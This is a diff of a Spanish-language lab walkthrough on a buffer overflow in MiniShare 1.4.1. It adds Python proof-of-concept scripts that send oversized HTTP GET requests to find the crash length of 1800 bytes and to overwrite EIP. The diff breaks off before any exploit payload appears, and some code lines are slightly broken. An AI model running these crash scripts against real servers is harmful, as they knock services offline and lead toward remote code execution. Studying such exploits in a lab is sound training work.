@@ -27,9 +27,10 @@ Para ver que comando vamos a usar, utilizaremos burpsuite y un proxy
 ### Screenshot
 ![image](https://user-images.githubusercontent.com/104048850/180593888-219158db-ad4b-454e-a6e5-2aa429d6c417.png)
 ***
-Ahora  ejecutamos el siguinte script  para ver la capacidad del buffer 
+                 Ahora  ejecutamos el siguinte script  para ver la capacidad del buffer prueba.py
 
 ```
+n
 #!/usr/bin/python3.8
 # This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1
 
@@ -44,11 +45,55 @@ while True:
     FUZZ += "A" * 100
     print("Fuzzing with {} bytes".format(len(FUZZ)))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect = s.connect(("192.168.72.135", 80))
+    connect = s.connect(("192.168.a,b", 80))
     # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
     s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
     s.recv(1024)
     s.close()
 
 ```
+Ejecutamos prueba.py arrojandonos que su cvapacidad es de 1800 Bytes  nota: El minishare tiene que estar corriendo, cada ves que ejecutemos una acciones debemos reiniciar 
+```
+python prueba.py 
+
+```
+
+### Screenshot
+![image](https://user-images.githubusercontent.com/104048850/180594493-62683eb9-2e28-498a-911c-de43adb2b45d.png)
+
+Ahora que sabemos que el tamaño máximo de la pila es 1800, podemos modificar nuestro script para enviarlos en un solo paquete y procedemos a ejecutar 
+```
+ mousepad prueba2.py 
+ 
+```
+### Screenshot
+
+```
+ !/usr/bin/python3.8
+# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1
+
+# Part 2 of proof of concept by Vry4n
+# This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)
+import socket
+
+FUZZ = "A" * 1800
+
+print("Fuzzing with {} bytes".format(len(FUZZ)))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(("192.168.a.b", 80))
+# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
+s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
+s.recv(1024)
+s.close()
+```
+Ahora procedemos a ejecutar el prueba2.py
+```
+
+
+
+
+
+
+
+
 
